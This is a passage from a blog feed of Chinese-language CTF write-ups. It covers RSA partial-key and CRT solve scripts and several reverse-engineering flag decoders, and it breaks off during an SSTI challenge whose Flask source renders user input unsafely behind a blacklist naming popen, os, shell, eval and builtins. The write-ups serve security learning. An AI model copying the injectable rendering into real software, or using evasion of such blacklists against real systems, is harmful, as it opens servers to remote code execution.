class="hljs-number">1836794759996264077871820946090708779709415760553736759453665641907562256633157424959089180650539327925671892742819931875681606982615287882656254828326465758462357812873839261469783652663796071814218493268788421243190729887313099383264588659922912876424206670310928514588754069909128149471326084547056385690037197908766053620702238356084124023146075698878494434053246157524775269473152458661801907641122308756667762880284617915774590075511686821816948174618196839335059944389423693187930672934293905608970421003536691336581450927887931599275461176935079227494931457562345640133982771901848553204154760760399724074615092290799119053032875792219794072963200108352944441876206386518960615891547166767499506114294860833404421893612197040731184031783165365621722947731966143226777081983415797778111715332055871302609049501876860012070502369090417942239749695034267695710324328867728296996779</span><br>pbits = <span class="hljs-number">512</span><br><br><span class="hljs-comment"># leak_p = 57303545022436031674172379509633863887077</span><br><span class="hljs-comment"># print(hex(leak_p&lt;&lt;8))</span><br><span class="hljs-comment"># leak_p = 0xa8666553ec59acad3ed8208f060abba8e500</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>**<span class="hljs-number">24</span>):<br>    leak_p = <span class="hljs-number">0xfef17ad62b2573f0f1fd707b2f273922860034731234b9ba82fc303b7c4faad4</span><br>    leak_p = leak_p + <span class="hljs-built_in">int</span>(<span class="hljs-built_in">hex</span>(i),<span class="hljs-number">16</span>)<br><span class="hljs-comment">#     print(leak_p)</span><br><br>    kbits = pbits - leak_p.nbits()  <span class="hljs-comment"># 设置界的 bit上限</span><br>    <span class="hljs-comment">#print(kbits)</span><br><br>    p_high = leak_p &lt;&lt; kbits<br>    PR.&lt;x&gt; = PolynomialRing(Zmod(n))<br>    f = p_high + x<br>    roots = f.small_roots(X=<span class="hljs-number">2</span>^kbits, beta=<span class="hljs-number">0.4</span>)  <span class="hljs-comment">#计算模多项式的小整数根</span><br><br>    <span class="hljs-keyword">if</span>(roots):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;roots =&#x27;</span>,roots)<br>        p = p_high + <span class="hljs-built_in">int</span>(roots[<span class="hljs-number">0</span>])<br>        q = n//<span class="hljs-built_in">int</span>(p)<br>        <span class="hljs-keyword">assert</span> p*q == n<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;p=&quot;</span>,p)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;q=&quot;</span>,q)<br>        phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>        d = invert(e,phi)<br>        flag = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(c,d,n))<br>        <span class="hljs-built_in">print</span>(long_to_bytes(flag))<br></code></pre></td></tr></table></figure><h3 id="5-5"><a href="#5-5" class="headerlink" title="5-5"></a>5-5</h3><p>先联立n和hint解p，q，再计算发现是ct &#x3D; pow(m,672,n)，e实际为672，与p-1，q-1均不互素，采用中国剩余定理求解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs Python"> p =  <span class="hljs-number">5437194409937079365796361293969364604939627149039784073055530959237847229851327425147129937145179737622218931435682823431052499320577471182347267982471329</span><br>q = <span class="hljs-number">6702589700303909273170909376593932709002828248723758321037524045275822447495902310058252026284620026874261411365267847853883194081655189179013810230756257</span><br>e = <span class="hljs-number">672</span><br>c = <span class="hljs-number">24482128269957355675512496312977308128712253968496848873519792376434347925427116612997489113223781321628516365811583310346553402215907938918891908853234881284620764982626375301219763593402089309909155204943747718536894186749932544428588048770663458669109073657836937287831725958017345747881678942488157429000</span><br><br>R.&lt;x&gt; = Zmod(p)[]<br>f = x ^ e - c<br>f = f.monic()<br>res1 = f.roots()<br><span class="hljs-built_in">print</span>(res1)<br><span class="hljs-comment">#类似方法求res2</span><br><br><span class="hljs-keyword">import</span> libnum<br><br><span class="hljs-comment">#循环使用中国剩余定理</span><br><br>res1 =..<br>res2 =..<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res1:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> res2:<br>        m = libnum.solve_crt([<span class="hljs-built_in">int</span>(i[<span class="hljs-number">0</span>]),<span class="hljs-built_in">int</span>(j[<span class="hljs-number">0</span>])],[p,q])<br>        flag = long_to_bytes(m)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;CTF&#x27;</span>  <span class="hljs-keyword">in</span> flag:<br>            <br>            <span class="hljs-built_in">print</span>(flag)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> flag:<br>            <span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908618.png" alt="img"></p><p>FastP0w3r_4nd_AMM_0f_R5A</p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="6-1"><a href="#6-1" class="headerlink" title="6-1"></a>6-1</h3><p>程序逻辑</p><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908642.png" alt="img"></p><p><code>main_tmp</code>给了初始值0xDEAD,<code>v12(enc)</code>开起动调发现是定值，直接dump出来就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br>index = <span class="hljs-number">0xDEAD</span><br>tmp = []<br><br>enc=[<span class="hljs-number">0x00000000000022B9</span>, <span class="hljs-number">0x000000000000C9F8</span>, <span class="hljs-number">0x0000000000008C89</span>, <span class="hljs-number">0x000000000000FF18</span>, <span class="hljs-number">0x0000000000001439</span>, <span class="hljs-number">0x0000000000004E0A</span>, <span class="hljs-number">0x0000000000002A8B</span>, <span class="hljs-number">0x00000000000007CB</span>, <span class="hljs-number">0x000000000000BDEB</span>, <span class="hljs-number">0x000000000000FAAB</span>, <span class="hljs-number">0x0000000000003FFB</span>, <span class="hljs-number">0x000000000000784B</span>, <span class="hljs-number">0x0000000000009F1E</span>, <span class="hljs-number">0x0000000000004FEB</span>, <span class="hljs-number">0x0000000000004D0B</span>, <span class="hljs-number">0x000000000000D08E</span>, <span class="hljs-number">0x00000000000038BB</span>, <span class="hljs-number">0x000000000000CBAE</span>, <span class="hljs-number">0x000000000000D2CE</span>, <span class="hljs-number">0x000000000000913E</span>, <span class="hljs-number">0x0000000000000A6B</span>, <span class="hljs-number">0x000000000000F03B</span>, <span class="hljs-number">0x000000000000507B</span>, <span class="hljs-number">0x000000000000398B</span>, <span class="hljs-number">0x00000000000093DE</span>, <span class="hljs-number">0x0000000000003CCE</span>, <span class="hljs-number">0x000000000000459E</span>, <span class="hljs-number">0x0000000000004ABE</span>, <span class="hljs-number">0x000000000000553E</span>, <span class="hljs-number">0x000000000000316E</span>, <span class="hljs-number">0x00000000000033BE</span>, <span class="hljs-number">0x00000000000042FE</span>, <span class="hljs-number">0x000000000000CECE</span>, <span class="hljs-number">0x0000000000004DDE</span>, <span class="hljs-number">0x000000000000982B</span>, <span class="hljs-number">0x000000000000A31B</span>, <span class="hljs-number">0x000000000000802E</span>, <span class="hljs-number">0x00000000000012EE</span>, <span class="hljs-number">0x000000000000F67A</span>, <span class="hljs-number">0x000000000000EB79</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">40</span>):<br>    index = <span class="hljs-number">0x123</span> * index + <span class="hljs-number">0x456</span><br>    index = index % <span class="hljs-number">65536</span> <br>    tmp.append(index)<br><span class="hljs-comment"># print(tmp)</span><br><br>flag_1=[]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">40</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0xffff</span>):<br>        <span class="hljs-keyword">if</span>(j^tmp[i] == enc[i]):<br>            <span class="hljs-built_in">print</span>(j,end=<span class="hljs-string">&quot;, &quot;</span>)<br>            flag_1.append(j)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(flag_1)<br><br>flag=<span class="hljs-string">&quot;&quot;</span> <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">39</span>,<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>    flag_1[i] = (flag_1[i] &gt;&gt; <span class="hljs-number">4</span>) | ((flag_1[i-<span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0xff</span>)<br>    flag = <span class="hljs-built_in">chr</span>(flag_1[i]) + flag<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;DA&#x27;</span>+flag)<br></code></pre></td></tr></table></figure><h3 id="6-2"><a href="#6-2" class="headerlink" title="6-2"></a>6-2</h3><p>这段去花</p><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908545.png" alt="img"></p><p>程序逻辑</p><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908822.png" alt="img"></p><p>中序遍历</p><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908864.png" alt="img"></p><p>后续遍历</p><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908677.png" alt="img"></p><p>还原二叉树，层次遍历得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">TreeNode</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, value</span>):<br>        <span class="hljs-variable language_">self</span>.value = value<br>        <span class="hljs-variable language_">self</span>.left = <span class="hljs-literal">None</span><br>        <span class="hljs-variable language_">self</span>.right = <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_tree</span>(<span class="hljs-params">inorder, postorder</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> inorder <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> postorder:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    root_value = postorder.pop()<br>    root = TreeNode(root_value)<br><br>    inorder_index = inorder.index(root_value)<br><br>    root.right = build_tree(inorder[inorder_index + <span class="hljs-number">1</span>:], postorder)<br>    root.left = build_tree(inorder[:inorder_index], postorder)<br>    <br>    <span class="hljs-keyword">return</span> root<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">preorder_traversal</span>(<span class="hljs-params">root</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> root:<br>        <span class="hljs-keyword">return</span> []<br>    <br>    result = [root.value] <br>    result += preorder_traversal(root.left)  <br>    result += preorder_traversal(root.right) <br>    <br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inorder_traversal</span>(<span class="hljs-params">root</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> root:<br>        <span class="hljs-keyword">return</span> []<br>    <br>    result = inorder_traversal(root.left) <br>    result.append(root.value)<br>    result += inorder_traversal(root.right) <br>    <br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">postorder_traversal</span>(<span class="hljs-params">root</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> root:<br>        <span class="hljs-keyword">return</span> []<br>    <br>    result = postorder_traversal(root.left) <br>    result += postorder_traversal(root.right) <br>    result.append(root.value) <br>    <br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">preorder_traversal</span>(<span class="hljs-params">root</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> root:<br>        <span class="hljs-keyword">return</span> []<br>    <br>    result = [root.value]  <br>    result += preorder_traversal(root.left)  <br>    result += preorder_traversal(root.right) <br>    <br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">level_order_traversal</span>(<span class="hljs-params">root</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> root:<br>        <span class="hljs-keyword">return</span> []<br><br>    result = []<br>    queue = [root]<br><br>    <span class="hljs-keyword">while</span> queue:<br>        level_size = <span class="hljs-built_in">len</span>(queue)<br>        level_nodes = []<br><br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(level_size):<br>            node = queue.pop(<span class="hljs-number">0</span>)<br>            level_nodes.append(node.value)<br><br>            <span class="hljs-keyword">if</span> node.left:<br>                queue.append(node.left)<br>            <span class="hljs-keyword">if</span> node.right:<br>                queue.append(node.right)<br><br>        result.append(<span class="hljs-string">&#x27;&#x27;</span>.join(level_nodes))  <br><br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-comment"># 中序遍历和后序遍历的结果</span><br>inorder = <span class="hljs-built_in">list</span>(<span class="hljs-string">&quot;ja7Cws_A3daTd4qDo8&#125;F_Sd&#123;a&quot;</span>)<br>postorder = <span class="hljs-built_in">list</span>(<span class="hljs-string">&quot;j7aw_sC3addq4TAo&#125;8_Fda&#123;SD&quot;</span>)<br><br><span class="hljs-comment"># 构建二叉树</span><br>root = build_tree(inorder, postorder)<br><br><span class="hljs-comment"># 获取层次遍历的结果</span><br>level_order_result = level_order_traversal(root)<br><br><span class="hljs-keyword">for</span> level <span class="hljs-keyword">in</span> level_order_result:<br>    <span class="hljs-built_in">print</span>(level,end=<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-comment">#DASCTF&#123;asd48_daj7w_3adqo&#125;</span><br></code></pre></td></tr></table></figure><h3 id="6-3"><a href="#6-3" class="headerlink" title="6-3"></a>6-3</h3><p>这一段反复动调</p><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908047.png" alt="img"></p><ul><li>这个脚本里面的delta和data是从程序里面提取出来的</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs Python">delta = [<span class="hljs-number">0xBBDBD183</span>,<span class="hljs-number">0x5340F2E</span>,<span class="hljs-number">0xBEEFDEAD</span>]<br>data = [<span class="hljs-number">858337624</span>, <span class="hljs-number">1618346513</span>, <span class="hljs-number">1108893510</span>, <span class="hljs-number">1668575017</span>]<br>v1 = data[<span class="hljs-number">3</span>]<br>v2 = data[<span class="hljs-number">2</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">19</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>    key = delta[i%<span class="hljs-number">3</span>]<br>    <span class="hljs-keyword">if</span>(key == <span class="hljs-number">0xBBDBD183</span>):<br>        tmp = v1<br>        v1 = v1 ^ key<br>        v1 = ((v1 &amp; <span class="hljs-number">0xff</span>) &lt;&lt; <span class="hljs-number">16</span>) | ((v1 &amp; <span class="hljs-number">0xff00</span>)) | ((v1 &amp; <span class="hljs-number">0xff0000</span>) &lt;&lt; <span class="hljs-number">8</span>) | ((v1 &amp; <span class="hljs-number">0xff000000</span>) &gt;&gt; <span class="hljs-number">24</span>)<br>        v1 = v1 ^ key<br>        v1 = v1 ^ v2<br>        v2 = tmp<br>    <span class="hljs-keyword">elif</span>(key == <span class="hljs-number">0x5340F2E</span>):<br>        tmp = v1<br>        v1 = v2 ^ v1<br>        v2 = tmp<br>    <span class="hljs-keyword">else</span>:<br>        tmp = v1<br>        v1 = v1 ^ key<br>        v1 = ((v1 &amp; <span class="hljs-number">0xff</span>) &lt;&lt; <span class="hljs-number">16</span>) | ((v1 &amp; <span class="hljs-number">0xff00</span>) &gt;&gt; <span class="hljs-number">8</span>) | ((v1 &amp; <span class="hljs-number">0xff0000</span>) &gt;&gt; <span class="hljs-number">8</span>) | ((v1 &amp; <span class="hljs-number">0xff000000</span>))<br>        v1 = v1 ^ key<br>        v1 = v1 ^ v2<br>        v2 = tmp<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;v2:x&#125;</span>&quot;</span>,end=<span class="hljs-string">&#x27; &#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;v1:x&#125;</span>&quot;</span>,end=<span class="hljs-string">&#x27; &#x27;</span>)<br><span class="hljs-comment">#216c306f6f435f30</span><br><span class="hljs-comment">#逆序转换为字符</span><br>z1g_I3_S0_Coo0l!<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSTI-fenjing-思路总结</title>
    <link href="/2024/12/20/SSTI-fenjing-%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/"/>
    <url>/2024/12/20/SSTI-fenjing-%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="SSTI-fenjing-思路总结"><a href="#SSTI-fenjing-思路总结" class="headerlink" title="SSTI-fenjing-思路总结"></a>SSTI-fenjing-思路总结</h1><h3 id="2024-pwnsecCTF-jinjia2-master"><a href="#2024-pwnsecCTF-jinjia2-master" class="headerlink" title="2024-pwnsecCTF-jinjia2 master"></a>2024-pwnsecCTF-jinjia2 master</h3><ul><li>SSTI模版注入，app.py源码如下</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template_string<br><span class="hljs-keyword">import</span> html<br><br>app = Flask(__name__)<br><br>BLACKLIST = [<br>    <span class="hljs-string">&#x27;init&#x27;</span>,<span class="hljs-string">&#x27;globals&#x27;</span>,<span class="hljs-string">&#x27;builtins&#x27;</span>,<span class="hljs-string">&#x27;import&#x27;</span>,<span class="hljs-string">&#x27;os&#x27;</span>,<span class="hljs-string">&#x27;popen&#x27;</span>,<span class="hljs-string">&#x27;read&#x27;</span>,<span class="hljs-string">&#x27;request&#x27;</span>,<span class="hljs-string">&#x27;application&#x27;</span>,<span class="hljs-string">&#x27;TemplateReference&#x27;</span>,<br>    <span class="hljs-string">&#x27;cycler&#x27;</span>,<span class="hljs-string">&#x27;joiner&#x27;</span>,<span class="hljs-string">&#x27;namespace&#x27;</span>,<span class="hljs-string">&#x27;lipsum&#x27;</span>,<span class="hljs-string">&#x27;getitem&#x27;</span>,<span class="hljs-string">&#x27;config&#x27;</span>,<span class="hljs-string">&#x27;for&#x27;</span>,<span class="hljs-string">&#x27;eval&#x27;</span>,<span class="hljs-string">&#x27;flashed&#x27;</span>,<span class="hljs-string">&#x27;range&#x27;</span>,<span class="hljs-string">&#x27;class&#x27;</span>,<span class="hljs-string">&#x27;mro&#x27;</span>,<br>    <span class="hljs-string">&#x27;subclasses&#x27;</span>,<span class="hljs-string">&#x27;pyfile&#x27;</span>,<span class="hljs-string">&#x27;shell&#x27;</span>,<span class="hljs-string">&#x27;stdout&#x27;</span>,<span class="hljs-string">&#x27;base&#x27;</span>,<span class="hljs-string">&#x27;if&#x27;</span>,<span class="hljs-string">&#x27;module&#x27;</span>,<span class="hljs-string">&#x27;RUNCMD&#x27;</span>,<span class="hljs-string">&#x27;format&#x27;</span>,<span class="hljs-string">&#x27;args&#x27;</span>,<span class="hljs-string">&#x27;values&#x27;</span>,<span class="hljs-string">&#x27;form&#x27;</span>,<br>    <span class="hljs-string">&#x27;cookies&#x27;</span>,<span class="hljs-string">&#x27;headers&#x27;</span>,<span class="hljs-string">&#x27;pragma&#x27;</span>,<span class="hljs-string">&#x27;mimetype&#x27;</span>,<span class="hljs-string">&#x27;origin&#x27;</span>,<span class="hljs-string">&#x27;referrer&#x27;</span>,<span class="hljs-string">&#x27;pop&#x27;</span>,<span class="hljs-string">&#x27;attr&#x27;</span>,<span class="hljs-string">&#x27;chr&#x27;</span>,<span class="hljs-string">&#x27;free&#x27;</span>,<span class="hljs-string">&#x27;palestine&#x27;</span>,<span class="hljs-string">&#x27;with&#x27;</span><br>]<br><br>BLACKLIST += [<span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;7&#x27;</span>,<span class="hljs-string">&#x27;8&#x27;</span>,<span class="hljs-string">&#x27;9&#x27;</span>]<br><br>BLACKLIST += [<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&quot;`&quot;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;[&#x27;</span>,<span class="hljs-string">&#x27;]&#x27;</span>,<span class="hljs-string">&#x27;&#123;&#123;&#x27;</span>,<span class="hljs-string">&#x27;&#125;&#125;&#x27;</span>,<span class="hljs-string">&#x27;#&#x27;</span>]<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">home</span>():<br>    c = request.form.get(<span class="hljs-string">&#x27;c&#x27;</span>) <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span> <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>    error_message = <span class="hljs-literal">None</span><br>    rendered_template = <span class="hljs-literal">None</span><br>    <br>    <span class="hljs-keyword">if</span> c:<br>        c = c.lower()<br>        <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> BLACKLIST:<br>            <span class="hljs-keyword">if</span> item <span class="hljs-keyword">in</span> c:<br>                error_message = <span class="hljs-string">&quot;Invalid input detected!&quot;</span><br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            rendered_template = html.unescape(render_template_string(c))<br>            <span class="hljs-comment"># can you?</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;fr3e_p4le$t1ne&amp;!&quot;</span> <span class="hljs-keyword">in</span> rendered_template:<br>                <span class="hljs-keyword">try</span>:<br>                    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span 